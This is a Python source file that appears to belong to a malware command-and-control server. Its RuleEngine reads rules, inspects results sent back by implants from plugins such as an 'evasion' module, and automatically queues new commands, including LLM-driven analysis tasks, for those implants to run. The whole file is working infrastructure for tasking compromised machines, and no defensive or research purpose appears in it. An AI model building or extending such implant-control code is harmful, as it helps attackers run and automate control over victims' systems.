import json
import os
from typing import Dict, Any

class RuleEngine:
    def __init__(self, rules_file="rules.json"):
        self.rules_file = os.path.join("crawler", "c2", rules_file)
        self.rules = self._load_rules()
        print(f"RuleEngine initialized with {len(self.rules)} rules.")

    def _load_rules(self):
        if not os.path.exists(self.rules_file):
            return []
        try:
            with open(self.rules_file, 'r') as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError) as e:
            print(f"Error loading rules file: {e}")
            return []

    def process_data(self, implant_id: str, plugin_name: str, result: Dict[str, Any], db_session):
        triggered_actions = []
        for rule in self.rules:
            if self._check_condition(rule.get("condition", {}), plugin_name, result):
                action = rule.get("action", {})
                print(f"Rule '{rule.get('name')}' triggered for implant {implant_id}.")
                self._execute_action(action, implant_id, result, db_session)
                triggered_actions.append(action)
        return triggered_actions

    def _check_condition(self, condition: Dict[str, Any], plugin_name: str, result: Dict[str, Any]) -> bool:
        if condition.get("plugin") != plugin_name:
            return False

        if condition.get("result_not_empty", False):
            if plugin_name == 'evasion':
                return any(key != 'status' for key in result.keys())
            elif result:
                return True

        return False

    def _execute_action(self, action: Dict[str, Any], implant_id: str, trigger_result: Dict[str, Any], db_session):
        from . import models
        action_type = action.get("type")

        if action_type == "task":
            task_data = action.get("task_details", {})
            command = task_data.get("command")
            args = task_data.get("args", {})
            if not command: return
            db_task = models.Task(implant_id=implant_id, command=command, args=args, status="pending")
            db_session.add(db_task)
            print(f"Action: Queued new task '{command}' for implant {implant_id}.")

        elif action_type == "analyze_with_llm":
            prompt_template = action.get("prompt_template")
            if not prompt_template: return

            try:
                trigger_data_str = json.dumps(trigger_result, indent=2)
                text_for_llm = prompt_template.format(trigger_data=trigger_data_str)
            except KeyError: return

            llm_args = {"plugin_name": "llm_analyzer", "text": text_for_llm}
            db_task = models.Task(implant_id=implant_id, command="start_plugin", args=llm_args, status="pending")
            db_session.add(db_task)
            db_session.flush()
            print(f"Action: Queued llm_analyzer task (ID: {db_task.id}) for implant {implant_id}.")

        elif action_type == "alert":
            print(f"ALERT: {action.get('message', 'No message provided.')} (Implant: {implant_id})")

        else:
            print(f"Unknown action type: {action_type}")
